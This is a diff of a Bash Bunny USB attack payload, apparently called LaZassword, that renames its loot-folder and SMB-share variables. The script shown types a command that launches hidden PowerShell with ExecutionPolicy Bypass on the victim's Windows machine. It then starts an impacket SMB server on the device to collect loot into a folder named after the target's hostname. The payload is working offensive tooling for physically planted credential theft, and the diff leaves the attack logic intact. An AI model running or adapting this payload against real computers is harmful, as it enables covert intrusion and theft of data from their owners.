@@ -28,11 +28,16 @@ done
 #############################################
 
 # Define keyboard layout here ('us' is default):
-keyboard_lang="us"
+keyboard_lang=us
 
-# Define name of the loot folder here (has to match with the one in LaZassword.ps1, hostname is default):
-lootfolder=$TARGET_HOSTNAME
+# Define name of the SMB loot folder here (hostname is default):
+lootfolder=/root/udisk/loot/LaZassword/$TARGET_HOSTNAME"_SMB"
 
+# Define the SMB loot file variable (SMBoutput.txt is default):
+lootfile=SMBoutput.txt
+
+# Define which folder to use for the SMB share (/root/udisk/SMBShare is default):
+smbsharefolder=/root/udisk/SMBShare
 
 #####################################
 #		SETUP		    #
@@ -44,12 +49,17 @@ DUCKY_LANG=$keyboard_lang
 # Define the SWITCH_POSITION variable
 GET SWITCH_POSITION
 
-# Create the LaZassword directory
-mkdir -p /root/udisk/loot/LaZassword
+# Create the SMB loot folder directory
+mkdir -p $lootfolder
+
+# Create the SMB loot file
+touch $lootfolder/$lootfile
+
+# Create the SMB share folder
+mkdir -p $smbsharefolder
 
 # Attack
 LED ATTACK
-
 
 #######################################
 #		PAYLOAD		      #
@@ -59,10 +69,10 @@ LED ATTACK
 RUN WIN "PowerShell -windowstyle hidden -ExecutionPolicy Bypass .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\bypass.ps1')"
 
 # Start the impacket server to receive a signal
-python /tools/impacket/examples/smbserver.py -smb2support LaZassword /root/udisk/loot/LaZassword/$lootfolder >> /root/udisk/loot/LaZassword/$lootfolder/SMBoutput.txt &
+python /tools/impacket/examples/smbserver.py -smb2support LaZassword $smbsharefolder > $lootfolder/$lootfile &
 
 # Wait for the signal
-while ! grep -wq "Incoming" /root/udisk/loot/LaZassword/$lootfolder/SMBoutput.txt
+while ! grep -wq "Incoming" $lootfolder/$lootfile
 do
 LED ATTACK
 sleep 1
